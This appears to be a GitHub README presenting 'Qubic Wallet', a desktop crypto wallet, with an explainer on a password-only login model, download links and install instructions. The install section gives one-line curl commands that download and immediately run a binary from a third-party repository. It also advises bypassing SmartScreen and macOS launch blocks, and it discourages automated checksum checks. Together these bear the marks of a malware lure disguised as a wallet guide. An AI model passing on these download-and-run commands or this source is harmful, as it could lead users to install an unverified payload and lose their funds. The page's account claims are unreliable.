![Qubic Wallet login password and account model](assets/banner-setup.png)

# How Qubic Wallet Login Works: One Password, One Account

The password does not unlock a stored account. It selects which account exists.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Login behaviour described here is from the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) and its local server routes.

> A password that is off by one character is not a failed login. It is a different account, and it will open empty.

Qubic Wallet login takes one password and nothing else: no username, no email, no second factor. That password encrypts your seed and names the file it is stored in, so typing it opens the matching account and typing a different one opens a different account. There is no server-side check that can tell you the password was wrong, which is why a typo looks like an empty wallet rather than an error.

<!-- ARTICLE-BODY-BEGIN -->

## The password is the account selector

The seed is stored encrypted with your password in a file whose name comes from a hash of that password. Login hashes what you typed, looks for the file that matches, and decrypts it if it is there. Nothing verifies the password against a stored copy, so the app cannot distinguish "wrong password" from "account that has never been created" - both look like an empty slot. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-create-first-account.md">account creation walkthrough</a> shows the moment that file is written.

## Unlocking is not restoring

An unlock decrypts an account that already exists on this machine. A restore rebuilds an account from a seed on a machine that has never seen it. Confusing the two is the most common setup mistake: people reinstall, type the old password, get an empty wallet, and conclude the account is gone. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-auto-lock-settings.md">auto-lock behaviour</a> belongs to the unlock side, which is why changing it never affects your balance.

Before you troubleshoot a login that behaves oddly, update to the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>, so what you see matches what this page describes.

## The empty wallet after a typo

If your balance disappears after login, stop before creating anything new. Close the app, reopen it, and retype the password slowly, watching for a capital Q, a trailing space or a keyboard layout change. An account opened by a mistyped password has its own seed, its own addresses and no funds, and every action you take in it is real - so do not send anything until you are sure which account you are in. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-forgot-password-vault-reset.md">password and vault reset guide</a> covers what to do when the correct password does not produce the expected account.

## Several accounts, one window

Each password is a separate account with its own seed and its own backup obligation. They coexist in the same app, and switching between them is a matter of logging out and back in rather than picking from a list of names. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-multiple-accounts.md">multiple accounts guide</a> covers naming conventions that keep them apart when the passwords are similar.

## Can you change the password?

Not in the sense other apps mean. The password is what derives and decrypts the account, so there is no "old password to new password" field anywhere in the interface - typing a different password does not update an account, it opens or creates a different one. That is why a forgotten password is an account-level problem rather than a settings problem.

What people usually want is either a stronger password on the same account, or access to an account whose password they half-remember. The first means creating a new account and moving the funds; the second is a restore job, and a restore takes the seed and the password that produced it.

## FAQ

### Why is my wallet empty after login?

Almost always a different password opened a different account. Retype it carefully, including case, and check that you are not on another machine where the account was never restored.

### Does login need a username?

No. There is no username field and no account directory; the password alone decides which local account opens.

### Can I log in on another computer?

Only after restoring the account there with the seed, or by copying the account files across. The password alone carries nothing between machines.

### Is the password stored anywhere?

It is not written to disk in readable form. It is used to encrypt the seed, and the file name derives from its hash.

### What does login do offline?

It unlocks the account locally and shows the last known state. Balances and transfers need the network, so an offline login is a read of local data, not a live balance.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Forgot password and vault reset](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-forgot-password-vault-reset.md)
- [Multiple accounts in one app](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-multiple-accounts.md)
- [Auto-lock settings](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-auto-lock-settings.md)
- [Creating your first account](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-create-first-account.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
